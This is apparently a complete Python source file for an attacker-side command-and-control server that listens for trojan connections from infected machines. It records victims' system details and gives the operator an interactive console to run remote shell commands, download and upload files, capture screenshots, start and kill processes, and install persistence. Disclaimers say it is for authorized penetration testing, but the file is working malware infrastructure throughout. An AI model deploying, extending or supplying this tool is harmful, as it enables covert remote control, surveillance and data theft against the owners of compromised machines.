"""
═══════════════════════════════════════════════════════════════════════════════
COMMAND & CONTROL (C2) SERVER - ATTACKER SIDE
═══════════════════════════════════════════════════════════════════════════════
⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY

This C2 server:
1. Listens for trojan connections
2. Receives system information from infected machines
3. Sends commands to trojan clients
4. Manages file transfers (upload/download)
5. Maintains connection with multiple clients
6. Logs all activities

═══════════════════════════════════════════════════════════════════════════════
"""

import socket
import threading
import json
import sys
import os
from datetime import datetime
from pathlib import Path

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

C2_HOST = "0.0.0.0"              # Listen on all interfaces
C2_PORT = 4444                    # C2 listening port
MAX_CLIENTS = 10                  # Maximum concurrent connections
CHUNK_SIZE = 4096                 # File transfer chunk size
LOG_FILE = "c2_activity.log"      # Activity log

# ═══════════════════════════════════════════════════════════════════════════════
# LOGGING SYSTEM
# ═══════════════════════════════════════════════════════════════════════════════

class Logger:
    """Log all C2 activities for forensics"""
    
    @staticmethod
    def log(message, level="INFO"):
        """Write log entry with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        print(log_entry)
        
        with open(LOG_FILE, 'a') as f:
            f.write(log_entry + "\n")

# ═══════════════════════════════════════════════════════════════════════════════
# CLIENT HANDLER
# ═══════════════════════════════════════════════════════════════════════════════

class ClientHandler(threading.Thread):
    """
    Handle individual trojan client connection
    
    Each infected machine gets a ClientHandler thread
    """
    
    def __init__(self, client_socket, client_address, client_id):
        threading.Thread.__init__(self)
        self.client_socket = client_socket
        self.client_address = client_address
        self.client_id = client_id
        self.daemon = True
        self.system_info = None
        self.connected = True
    
    def receive_initial_info(self):
        """
        Receive system information from newly connected trojan
        
        Format: "[CONNECTED] {system_info_json}"
        
        Info includes:
        - Hostname
        - OS version
        - CPU/Memory info
        - Current user
        - Architecture
        """
        try:
            data = self.client_socket.recv(4096)
            if data:
                info_text = data.decode()
                Logger.log(
                    f"[CLIENT {self.client_id}] Initial connection from {self.client_address[0]}",
                    "CONNECTION"
                )
                Logger.log(
                    f"[CLIENT {self.client_id}] System Info:\n{info_text}",
                    "INFO"
                )
                self.system_info = info_text
                return True
        except Exception as e:
            Logger.log(f"Error receiving initial info: {e}", "ERROR")
        
        return False
    
    def send_command(self, command):
        """
        Send command to trojan client
        
        Command format:
        {
            "command": "command_type",
            "args": "command_arguments"
        }
        """
        try:
            self.client_socket.send(json.dumps(command).encode())
            Logger.log(
                f"[CLIENT {self.client_id}] Sent command: {command['command']}",
                "COMMAND"
            )
        except Exception as e:
            Logger.log(f"[CLIENT {self.client_id}] Error sending command: {e}", "ERROR")
            self.connected = False
    
    def receive_response(self):
        """
        Receive command execution result from trojan
        
        This blocks until response is received
        """
        try:
            response = self.client_socket.recv(4096).decode()
            return response
        except Exception as e:
            Logger.log(f"[CLIENT {self.client_id}] Error receiving response: {e}", "ERROR")
            self.connected = False
            return None
    
    def receive_file(self, save_path, file_size):
        """
        Receive file from trojan client
        
        Process:
        1. Receive file in chunks
        2. Write to disk
        3. Verify integrity
        """
        try:
            received = 0
            os.makedirs(os.path.dirname(save_path), exist_ok=True)
            
            with open(save_path, 'wb') as f:
                while received < file_size:
                    chunk = self.client_socket.recv(CHUNK_SIZE)
                    if not chunk:
                        break
                    f.write(chunk)
                    received += len(chunk)
            
            Logger.log(
                f"[CLIENT {self.client_id}] File received: {save_path}",
                "FILE"
            )
            return True
        except Exception as e:
            Logger.log(f"[CLIENT {self.client_id}] Error receiving file: {e}", "ERROR")
            return False
    
    def send_file(self, file_path):
        """
        Send file to trojan client
        
        Process:
        1. Check file exists
        2. Get file size
        3. Send metadata
        4. Send file contents
        """
        try:
            if not os.path.exists(file_path):
                self.send_command({
                    "command": "error",
                    "args": "File not found"
                })
                return False
            
            file_size = os.path.getsize(file_path)
            
            # Send metadata
            metadata = {
                "filename": os.path.basename(file_path),
                "size": file_size
            }
            self.client_socket.send(json.dumps(metadata).encode() + b"\n")
            
            # Send file
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    self.client_socket.send(chunk)
            
            Logger.log(
                f"[CLIENT {self.client_id}] File sent: {file_path}",
                "FILE"
            )
            return True
        except Exception as e:
            Logger.log(f"[CLIENT {self.client_id}] Error sending file: {e}", "ERROR")
            return False
    
    def interactive_shell(self):
        """
        Interactive command shell for trojan client
        
        User can:
        - Execute shell commands
        - Transfer files
        - Capture screenshots
        - Manage processes
        - And more...
        """
        print(f"\n[*] Connected to client {self.client_id}")
        print(f"[*] Type 'help' for available commands")
        print(f"[*] Type 'exit' to disconnect\n")
        
        while self.connected:
            try:
                # Get user input
                user_input = input(f"[CLIENT {self.client_id}]> ").strip()
                
                if not user_input:
                    continue
                
                # Parse command
                parts = user_input.split(" ", 1)
                command = parts[0]
                args = parts[1] if len(parts) > 1 else ""
                
                # Help command
                if command == "help":
                    self.show_help()
                
                # Exit/disconnect
                elif command == "exit":
                    cmd = {"command": "exit", "args": ""}
                    self.send_command(cmd)
                    self.connected = False
                    Logger.log(
                        f"[CLIENT {self.client_id}] Session terminated",
                        "DISCONNECT"
                    )
                
                # System information
                elif command == "sysinfo":
                    cmd = {"command": "sysinfo", "args": ""}
                    self.send_command(cmd)
                    response = self.receive_response()
                    print(response)
                
                # Execute shell command
                elif command == "shell":
                    if not args:
                        print("[-] Usage: shell <command>")
                        continue
                    cmd = {"command": "shell", "args": args}
                    self.send_command(cmd)
                    response = self.receive_response()
                    print(response)
                
                # Download file from target
                elif command == "download":
                    if not args:
                        print("[-] Usage: download <remote_file_path>")
                        continue
                    cmd = {"command": "download", "args": args}
                    self.send_command(cmd)
                    
                    # Receive file metadata
                    metadata_data = b""
                    while b"\n" not in metadata_data:
                        chunk = self.client_socket.recv(1024)
                        metadata_data += chunk
                    
                    try:
                        metadata = json.loads(metadata_data.decode().split("\n")[0])
                        filename = metadata.get("filename", "downloaded_file")
                        file_size = metadata.get("size", 0)
                        
                        save_path = f"downloads/{filename}"
                        self.receive_file(save_path, file_size)
                        print(f"[+] File saved to: {save_path}")
                    except:
                        print("[-] Failed to receive file")
                
                # Upload file to target
                elif command == "upload":
                    if not args:
                        print("[-] Usage: upload <local_file_path> <remote_path>")
                        continue
                    
                    parts = args.split(" ", 1)
                    local_file = parts[0]
                    remote_path = parts[1] if len(parts) > 1 else local_file
                    
                    if not os.path.exists(local_file):
                        print(f"[-] File not found: {local_file}")
                        continue
                    
                    cmd = {"command": "upload", "args": remote_path}
                    self.send_command(cmd)
                    self.send_file(local_file)
                
                # Take screenshot
                elif command == "screenshot":
                    cmd = {"command": "screenshot", "args": ""}
                    self.send_command(cmd)
                    
                    # Receive screenshot metadata
                    metadata_data = b""
                    while b"\n" not in metadata_data:
                        chunk = self.client_socket.recv(1024)
                        metadata_data += chunk
                    
                    try:
                        metadata = json.loads(metadata_data.decode().split("\n")[0])
                        file_size = metadata.get("size", 0)
                        filename = metadata.get("filename", "screenshot.png")
                        
                        save_path = f"screenshots/{filename}"
                        self.receive_file(save_path, file_size)
                        print(f"[+] Screenshot saved to: {save_path}")
                    except:
                        print("[-] Failed to receive screenshot")
                
                # List processes
                elif command == "processes":
                    cmd = {"command": "processes", "args": ""}
                    self.send_command(cmd)
                    response = self.receive_response()
                    print(response)
                
                # Kill process
                elif command == "kill":
                    if not args:
                        print("[-] Usage: kill <pid>")
                        continue
                    cmd = {"command": "kill_process", "args": args}
                    self.send_command(cmd)
                    response = self.receive_response()
                    print(response)
                
                # Start process
                elif command == "start":
                    if not args:
                        print("[-] Usage: start <command>")
                        continue
                    cmd = {"command": "start_process", "args": args}
                    self.send_command(cmd)
                    response = self.receive_response()
                    print(response)
                
                # Install persistence
                elif command == "persist":
                    cmd = {"command": "persist", "args": ""}
                    self.send_command(cmd)
                    response = self.receive_response()
                    print(response)
                
                # List files
                elif command == "ls":
                    if not args:
                        args = "."
                    cmd = {"command": "list_files", "args": args}
                    self.send_command(cmd)
                    response = self.receive_response()
                    print(response)
                
                else:
                    print("[-] Unknown command. Type 'help' for available commands")
            
            except KeyboardInterrupt:
                print("\n[-] Session interrupted")
                self.connected = False
            except Exception as e:
                print(f"[-] Error: {e}")
                self.connected = False
    
    def show_help(self):
        """Display available commands"""
        help_text = """
        ═══════════════════════════════════════════════════════════════
        AVAILABLE COMMANDS
        ═══════════════════════════════════════════════════════════════
        
        INFORMATION GATHERING:
          sysinfo                     - Get target system information
          processes                   - List running processes
          ls [directory]              - List files in directory
        
        COMMAND EXECUTION:
          shell <command>             - Execute shell command
          start <command>             - Start a process
          kill <pid>                  - Terminate process by PID
        
        FILE OPERATIONS:
          download <remote_path>      - Download file from target
          upload <local_path> <remote_path> - Upload file to target
          
        SURVEILLANCE:
          screenshot                  - Capture screen
        
        PERSISTENCE:
          persist                     - Install persistence mechanism
        
        SESSION:
          help                        - Show this help menu
          exit                        - Close connection to client
        
        ═══════════════════════════════════════════════════════════════
        """
        print(help_text)
    
    def run(self):
        """Main client handler thread"""
        if self.receive_initial_info():
            self.interactive_shell()
        else:
            Logger.log(
                f"[CLIENT {self.client_id}] Failed to receive initial info",
                "ERROR"
            )
        
        self.client_socket.close()
        Logger.log(
            f"[CLIENT {self.client_id}] Connection closed",
            "INFO"
        )

# ═══════════════════════════════════════════════════════════════════════════════
# C2 SERVER
# ═══════════════════════════════════════════════════════════════════════════════

class C2Server:
    """Main C2 server - listens for and manages trojan clients"""
    
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = []
        self.client_counter = 0
    
    def start(self):
        """
        Start C2 server
        
        Process:
        1. Create server socket
        2. Bind to port
        3. Listen for connections
        4. Handle each client in separate thread
        """
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(MAX_CLIENTS)
            
            Logger.log(
                f"C2 Server started on {self.host}:{self.port}",
                "START"
            )
            
            print(f"""
            ╔════════════════════════════════════════════════════════════╗
            ║     COMMAND & CONTROL SERVER - PENETRATION TESTING        ║
            ║                                                            ║
            ║  Server: {self.host}:{self.port}                             
            ║  Status: LISTENING FOR CONNECTIONS                        ║
            ║                                                            ║
            ║  ⚠️  FOR AUTHORIZED TESTING ONLY ⚠️                       ║
            ╚════════════════════════════════════════════════════════════╝
            """)
            
            self.accept_connections()
        
        except Exception as e:
            Logger.log(f"Error starting C2 server: {e}", "ERROR")
            sys.exit(1)
    
    def accept_connections(self):
        """Accept incoming connections from trojans"""
        try:
            while True:
                client_socket, client_address = self.server_socket.accept()
                self.client_counter += 1
                client_id = self.client_counter
                
                Logger.log(
                    f"New connection from {client_address[0]}:{client_address[1]} (ID: {client_id})",
                    "CONNECTION"
                )
                
                # Handle client in separate thread
                handler = ClientHandler(client_socket, client_address, client_id)
                handler.start()
                self.clients.append(handler)
        
        except KeyboardInterrupt:
            Logger.log("C2 Server shutting down...", "SHUTDOWN")
        except Exception as e:
            Logger.log(f"Error accepting connections: {e}", "ERROR")
        finally:
            self.server_socket.close()

# ═══════════════════════════════════════════════════════════════════════════════
# EXECUTION
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("""
    ╔════════════════════════════════════════════════════════════╗
    ║           C2 SERVER - INITIALIZATION                       ║
    ║                                                            ║
    ║  ⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️           ║
    ║  ⚠️  UNAUTHORIZED USE IS ILLEGAL ⚠️                       ║
    ║                                                            ║
    ║  This tool is designed for security professionals to:     ║
    ║  - Test antivirus detection capabilities                 ║
    ║  - Validate defensive security measures                  ║
    ║  - Conduct authorized penetration tests                  ║
    ║                                                            ║
    ╚════════════════════════════════════════════════════════════╝
    """)
    
    # Create downloads and screenshots directories
    os.makedirs("downloads", exist_ok=True)
    os.makedirs("screenshots", exist_ok=True)
    
    # Start C2 server
    server = C2Server(C2_HOST, C2_PORT)
    server.start()
